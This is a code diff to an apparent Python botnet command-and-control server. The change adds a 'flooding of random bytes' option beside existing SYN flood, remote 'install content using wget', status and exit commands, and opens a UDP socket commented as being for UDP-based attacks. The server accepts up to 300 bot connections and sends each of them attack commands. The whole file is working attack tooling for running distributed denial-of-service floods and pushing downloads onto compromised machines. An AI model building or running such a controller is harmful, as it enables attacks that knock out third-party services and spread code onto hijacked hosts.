@@ -12,7 +12,7 @@ def connectbot(clientsocketsource):
 def sendcommands(clientsocketsaddresssource):
 	while True:
 		print("Choose the type of command to execute ")
-		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot \n 4) Exit server")
+		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
 
 		input_get = raw_input()
 		for row in clientsocketsaddresssource:
@@ -29,6 +29,9 @@ def sendcommands(clientsocketsaddresssource):
 				row.send("STATUS")
 
 			if int(input_get) == 4:
+				row.send("FLOODING")
+
+			if int(input_get) == 5:
 				row.send("EXIT")
 				break
 
@@ -38,6 +41,9 @@ s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.bind(('',11111))
 
 s.listen(300)
+
+udpsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Create UDP socket for UDP based attacks
+udpsocket.bind(('',0)) #Bind to all interfaces and let the OS choose the port
 
 listofbots = list()
 referencestosockets = list()
@@ -58,3 +64,5 @@ for index in listofbots:
 
 commandsender.join()
 
+s.close()
+udpsocket.close()
